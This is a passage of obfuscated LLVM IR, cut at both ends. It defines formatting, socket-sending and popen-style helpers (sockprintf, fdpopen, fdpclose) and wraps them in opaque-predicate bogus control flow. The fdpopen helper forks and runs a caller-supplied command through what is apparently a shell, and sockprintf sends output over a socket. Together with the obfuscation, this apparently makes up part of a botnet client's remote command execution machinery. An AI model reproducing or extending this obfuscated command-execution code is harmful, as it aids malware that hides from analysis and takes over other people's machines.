  %145 = udiv i32 %144, %143
  store i32 %145, i32* %21, align 4
  %146 = load i32, i32* @x.11
  %147 = load i32, i32* @y.12
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart217, label %originalBB14alteredBB

originalBBpart217:                                ; preds = %originalBB14
  br label %98

; <label>:154:                                    ; preds = %originalBBpart212
  %155 = load i32, i32* %19, align 4
  %156 = icmp ne i32 %155, 0
  br i1 %156, label %157, label %190

; <label>:157:                                    ; preds = %154
  %158 = load i32, i32* %13, align 4
  %159 = icmp ne i32 %158, 0
  br i1 %159, label %160, label %170

; <label>:160:                                    ; preds = %157
  %161 = load i32, i32* %14, align 4
  %162 = and i32 %161, 2
  %163 = icmp ne i32 %162, 0
  br i1 %163, label %164, label %170

; <label>:164:                                    ; preds = %160
  %165 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %165, i32 45)
  %166 = load i32, i32* %20, align 4
  %167 = add nsw i32 %166, 1
  store i32 %167, i32* %20, align 4
  %168 = load i32, i32* %13, align 4
  %169 = add nsw i32 %168, -1
  store i32 %169, i32* %13, align 4
  br label %189

; <label>:170:                                    ; preds = %160, %157
  %171 = load i32, i32* @x.11
  %172 = load i32, i32* @y.12
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %170
  %179 = load i8*, i8** %17, align 8
  %180 = getelementptr inbounds i8, i8* %179, i32 -1
  store i8* %180, i8** %17, align 8
  store i8 45, i8* %180, align 1
  %181 = load i32, i32* @x.11
  %182 = load i32, i32* @y.12
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br label %189

; <label>:189:                                    ; preds = %originalBBpart221, %164
  br label %190

; <label>:190:                                    ; preds = %189, %154
  %191 = load i32, i32* %20, align 4
  %192 = load i8**, i8*** %9, align 8
  %193 = load i8*, i8** %17, align 8
  %194 = load i32, i32* %13, align 4
  %195 = load i32, i32* %14, align 4
  %196 = call i32 @prints(i8** %192, i8* %193, i32 %194, i32 %195)
  %197 = add nsw i32 %191, %196
  store i32 %197, i32* %8, align 4
  br label %198

; <label>:198:                                    ; preds = %190, %25
  %199 = load i32, i32* %8, align 4
  ret i32 %199

originalBBalteredBB:                              ; preds = %originalBB, %33
  %200 = load i32, i32* %12, align 4
  %201 = icmp ne i32 %200, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  %202 = load i32, i32* %11, align 4
  %203 = icmp eq i32 %202, 10
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %71
  %204 = load i32, i32* %10, align 4
  %205 = icmp slt i32 %204, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %98
  %206 = load i32, i32* %21, align 4
  %207 = icmp ne i32 %206, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %129
  %208 = load i32, i32* %18, align 4
  %_ = shl i32 %208, 48
  %_15 = sub i32 %208, 48
  %gen = mul i32 %_15, 48
  %209 = add nsw i32 %208, 48
  %210 = trunc i32 %209 to i8
  %211 = load i8*, i8** %17, align 8
  %212 = getelementptr inbounds i8, i8* %211, i32 -1
  store i8* %212, i8** %17, align 8
  store i8 %210, i8* %212, align 1
  %213 = load i32, i32* %11, align 4
  %214 = load i32, i32* %21, align 4
  %215 = udiv i32 %214, %213
  store i32 %215, i32* %21, align 4
  br label %originalBB14

originalBB19alteredBB:                            ; preds = %originalBB19, %170
  %216 = load i8*, i8** %17, align 8
  %217 = getelementptr inbounds i8, i8* %216, i32 -1
  store i8* %217, i8** %17, align 8
  store i8 45, i8* %217, align 1
  br label %originalBB19
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = load i32, i32* @x.13
  %4 = load i32, i32* @y.14
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  store i8** %0, i8*** %11, align 8
  store i32 %1, i32* %12, align 4
  %13 = load i8**, i8*** %11, align 8
  %14 = icmp ne i8** %13, null
  %15 = load i32, i32* @x.13
  %16 = load i32, i32* @y.14
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %47

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* @x.13
  %25 = load i32, i32* @y.14
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %23
  %32 = load i32, i32* %12, align 4
  %33 = trunc i32 %32 to i8
  %34 = load i8**, i8*** %11, align 8
  %35 = load i8*, i8** %34, align 8
  store i8 %33, i8* %35, align 1
  %36 = load i8**, i8*** %11, align 8
  %37 = load i8*, i8** %36, align 8
  %38 = getelementptr inbounds i8, i8* %37, i32 1
  store i8* %38, i8** %36, align 8
  %39 = load i32, i32* @x.13
  %40 = load i32, i32* @y.14
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %50

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = bitcast i32* %12 to i8*
  %49 = call i64 @write(i32 1, i8* %48, i64 1)
  br label %50

; <label>:50:                                     ; preds = %47, %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %51 = alloca i8**, align 8
  %52 = alloca i32, align 4
  store i8** %0, i8*** %51, align 8
  store i32 %1, i32* %52, align 4
  %53 = load i8**, i8*** %51, align 8
  %54 = icmp ne i8** %53, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %23
  %55 = load i32, i32* %12, align 4
  %56 = trunc i32 %55 to i8
  %57 = load i8**, i8*** %11, align 8
  %58 = load i8*, i8** %57, align 8
  store i8 %56, i8* %58, align 1
  %59 = load i8**, i8*** %11, align 8
  %60 = load i8*, i8** %59, align 8
  %61 = getelementptr inbounds i8, i8* %60, i32 1
  store i8* %61, i8** %59, align 8
  br label %originalBB1
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = load i32, i32* @x.15
  %4 = load i32, i32* @y.16
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %11, align 8
  store i8* %1, i8** %12, align 8
  %14 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %13, i32 0, i32 0
  %15 = bitcast %struct.__va_list_tag* %14 to i8*
  call void @llvm.va_start(i8* %15)
  %16 = load i8*, i8** %12, align 8
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %13, i32 0, i32 0
  %18 = call i32 @print(i8** %11, i8* %16, %struct.__va_list_tag* %17)
  %19 = load i32, i32* @x.15
  %20 = load i32, i32* @y.16
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %18

originalBBalteredBB:                              ; preds = %originalBB, %2
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %27, align 8
  store i8* %1, i8** %28, align 8
  %30 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %29, i32 0, i32 0
  %31 = bitcast %struct.__va_list_tag* %30 to i8*
  call void @llvm.va_start(i8* %31)
  %32 = load i8*, i8** %28, align 8
  %33 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %29, i32 0, i32 0
  %34 = call i32 @print(i8** %27, i8* %32, %struct.__va_list_tag* %33)
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #2
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = load i32, i32* @x.19
  %4 = load i32, i32* @y.20
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca [2 x i32], align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i8* %1, i8** %13, align 8
  %18 = load i8*, i8** %13, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp ne i32 %20, 114
  %22 = load i32, i32* @x.19
  %23 = load i32, i32* @y.20
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %21, label %30, label %35

; <label>:30:                                     ; preds = %originalBBpart2
  %31 = load i8*, i8** %13, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp ne i32 %33, 119
  br i1 %34, label %41, label %35

; <label>:35:                                     ; preds = %30, %originalBBpart2
  %36 = load i8*, i8** %13, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %35, %30
  store i32 -1, i32* %11, align 4
  br label %237

; <label>:42:                                     ; preds = %35
  %43 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i32 0, i32 0
  %44 = call i32 @pipe(i32* %43) #2
  %45 = icmp slt i32 %44, 0
  br i1 %45, label %46, label %63

; <label>:46:                                     ; preds = %42
  %47 = load i32, i32* @x.19
  %48 = load i32, i32* @y.20
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  store i32 -1, i32* %11, align 4
  %55 = load i32, i32* @x.19
  %56 = load i32, i32* @y.20
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %237

; <label>:63:                                     ; preds = %42
  %64 = load i32*, i32** @fdopen_pids, align 8
  %65 = icmp eq i32* %64, null
  br i1 %65, label %66, label %118

; <label>:66:                                     ; preds = %63
  %67 = call i32 @getdtablesize() #2
  store i32 %67, i32* %16, align 4
  %68 = icmp sle i32 %67, 0
  br i1 %68, label %69, label %86

; <label>:69:                                     ; preds = %66
  %70 = load i32, i32* @x.19
  %71 = load i32, i32* @y.20
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %69
  store i32 -1, i32* %11, align 4
  %78 = load i32, i32* @x.19
  %79 = load i32, i32* @y.20
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %237

; <label>:86:                                     ; preds = %66
  %87 = load i32, i32* %16, align 4
  %88 = sext i32 %87 to i64
  %89 = mul i64 %88, 4
  %90 = trunc i64 %89 to i32
  %91 = zext i32 %90 to i64
  %92 = call noalias i8* @malloc(i64 %91) #2
  %93 = bitcast i8* %92 to i32*
  store i32* %93, i32** @fdopen_pids, align 8
  %94 = icmp eq i32* %93, null
  br i1 %94, label %95, label %96

; <label>:95:                                     ; preds = %86
  store i32 -1, i32* %11, align 4
  br label %237

; <label>:96:                                     ; preds = %86
  %97 = load i32, i32* @x.19
  %98 = load i32, i32* @y.20
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %96
  %105 = load i32*, i32** @fdopen_pids, align 8
  %106 = bitcast i32* %105 to i8*
  %107 = load i32, i32* %16, align 4
  %108 = sext i32 %107 to i64
  %109 = mul i64 %108, 4
  call void @llvm.memset.p0i8.i64(i8* %106, i8 0, i64 %109, i32 1, i1 false)
  %110 = load i32, i32* @x.19
  %111 = load i32, i32* @y.20
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart218, label %originalBB10alteredBB

originalBBpart218:                                ; preds = %originalBB10
  br label %118

; <label>:118:                                    ; preds = %originalBBpart218, %63
  %119 = call i32 @vfork() #11
  store i32 %119, i32* %17, align 4
  switch i32 %119, label %213 [
    i32 -1, label %120
    i32 0, label %143
  ]

; <label>:120:                                    ; preds = %118
  %121 = load i32, i32* @x.19
  %122 = load i32, i32* @y.20
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %120
  %129 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %130 = load i32, i32* %129, align 4
  %131 = call i32 @close(i32 %130)
  %132 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %133 = load i32, i32* %132, align 4
  %134 = call i32 @close(i32 %133)
  store i32 -1, i32* %11, align 4
  %135 = load i32, i32* @x.19
  %136 = load i32, i32* @y.20
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br label %237

; <label>:143:                                    ; preds = %118
  %144 = load i8*, i8** %13, align 8
  %145 = load i8, i8* %144, align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 114
  br i1 %147, label %148, label %179

; <label>:148:                                    ; preds = %143
  %149 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %150 = load i32, i32* %149, align 4
  %151 = icmp ne i32 %150, 1
  br i1 %151, label %152, label %159

; <label>:152:                                    ; preds = %148
  %153 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %154 = load i32, i32* %153, align 4
  %155 = call i32 @dup2(i32 %154, i32 1) #2
  %156 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %157 = load i32, i32* %156, align 4
  %158 = call i32 @close(i32 %157)
  br label %159

; <label>:159:                                    ; preds = %152, %148
  %160 = load i32, i32* @x.19
  %161 = load i32, i32* @y.20
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %159
  %168 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %169 = load i32, i32* %168, align 4
  %170 = call i32 @close(i32 %169)
  %171 = load i32, i32* @x.19
  %172 = load i32, i32* @y.20
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBBpart227, label %originalBB24alteredBB

originalBBpart227:                                ; preds = %originalBB24
  br label %194

; <label>:179:                                    ; preds = %143
  %180 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %181 = load i32, i32* %180, align 4
  %182 = icmp ne i32 %181, 0
  br i1 %182, label %183, label %190

; <label>:183:                                    ; preds = %179
  %184 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %185 = load i32, i32* %184, align 4
  %186 = call i32 @dup2(i32 %185, i32 0) #2
  %187 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %188 = load i32, i32* %187, align 4
  %189 = call i32 @close(i32 %188)
  br label %190

; <label>:190:                                    ; preds = %183, %179
  %191 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %192 = load i32, i32* %191, align 4
  %193 = call i32 @close(i32 %192)
  br label %194

; <label>:194:                                    ; preds = %190, %originalBBpart227
  %195 = load i32, i32* @x.19
  %196 = load i32, i32* @y.20
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %194
  %203 = load i8*, i8** %12, align 8
  %204 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.18, i32 0, i32 0), i8* %203, i8* null) #2
  call void @_exit(i32 127) #12
  %205 = load i32, i32* @x.19
  %206 = load i32, i32* @y.20
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  unreachable

; <label>:213:                                    ; preds = %118
  %214 = load i8*, i8** %13, align 8
  %215 = load i8, i8* %214, align 1
  %216 = zext i8 %215 to i32
  %217 = icmp eq i32 %216, 114
  br i1 %217, label %218, label %224

; <label>:218:                                    ; preds = %213
  %219 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %220 = load i32, i32* %219, align 4
  store i32 %220, i32* %14, align 4
  %221 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %222 = load i32, i32* %221, align 4
  %223 = call i32 @close(i32 %222)
  br label %230

; <label>:224:                                    ; preds = %213
  %225 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %226 = load i32, i32* %225, align 4
  store i32 %226, i32* %14, align 4
  %227 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %228 = load i32, i32* %227, align 4
  %229 = call i32 @close(i32 %228)
  br label %230

; <label>:230:                                    ; preds = %224, %218
  %231 = load i32, i32* %17, align 4
  %232 = load i32*, i32** @fdopen_pids, align 8
  %233 = load i32, i32* %14, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds i32, i32* %232, i64 %234
  store i32 %231, i32* %235, align 4
  %236 = load i32, i32* %14, align 4
  store i32 %236, i32* %11, align 4
  br label %237

; <label>:237:                                    ; preds = %230, %originalBBpart222, %95, %originalBBpart28, %originalBBpart24, %41
  %238 = load i32, i32* %11, align 4
  ret i32 %238

originalBBalteredBB:                              ; preds = %originalBB, %2
  %239 = alloca i32, align 4
  %240 = alloca i8*, align 8
  %241 = alloca i8*, align 8
  %242 = alloca i32, align 4
  %243 = alloca [2 x i32], align 4
  %244 = alloca i32, align 4
  %245 = alloca i32, align 4
  store i8* %0, i8** %240, align 8
  store i8* %1, i8** %241, align 8
  %246 = load i8*, i8** %241, align 8
  %247 = load i8, i8* %246, align 1
  %248 = zext i8 %247 to i32
  %249 = icmp ne i32 %248, 114
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  store i32 -1, i32* %11, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %69
  store i32 -1, i32* %11, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %96
  %250 = load i32*, i32** @fdopen_pids, align 8
  %251 = bitcast i32* %250 to i8*
  %252 = load i32, i32* %16, align 4
  %253 = sext i32 %252 to i64
  %_ = sub i64 %253, 4
  %gen = mul i64 %_, 4
  %_11 = shl i64 %253, 4
  %_12 = shl i64 %253, 4
  %_13 = shl i64 %253, 4
  %_14 = sub i64 %253, 4
  %gen15 = mul i64 %_14, 4
  %_16 = shl i64 %253, 4
  %254 = mul i64 %253, 4
  call void @llvm.memset.p0i8.i64(i8* %251, i8 0, i64 %254, i32 1, i1 false)
  br label %originalBB10

originalBB20alteredBB:                            ; preds = %originalBB20, %120
  %255 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %256 = load i32, i32* %255, align 4
  %257 = call i32 @close(i32 %256)
  %258 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %259 = load i32, i32* %258, align 4
  %260 = call i32 @close(i32 %259)
  store i32 -1, i32* %11, align 4
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %159
  %261 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %262 = load i32, i32* %261, align 4
  %263 = call i32 @close(i32 %262)
  br label %originalBB24

originalBB29alteredBB:                            ; preds = %originalBB29, %194
  %264 = load i8*, i8** %12, align 8
  %265 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.18, i32 0, i32 0), i8* %264, i8* null) #2
  call void @_exit(i32 127) #12
  br label %originalBB29
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = load i32, i32* @x.21
  %3 = load i32, i32* @y.22
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.__sigset_t, align 8
  %14 = alloca %struct.__sigset_t, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %11, align 4
  %18 = load i32*, i32** @fdopen_pids, align 8
  %19 = icmp eq i32* %18, null
  %20 = load i32, i32* @x.21
  %21 = load i32, i32* @y.22
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %19, label %35, label %28

; <label>:28:                                     ; preds = %originalBBpart2
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %11, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = icmp eq i32 %33, 0
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %28, %originalBBpart2
  store i32 -1, i32* %10, align 4
  br label %158

; <label>:36:                                     ; preds = %28
  %37 = load i32, i32* @x.21
  %38 = load i32, i32* @y.22
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %36
  %45 = load i32, i32* %11, align 4
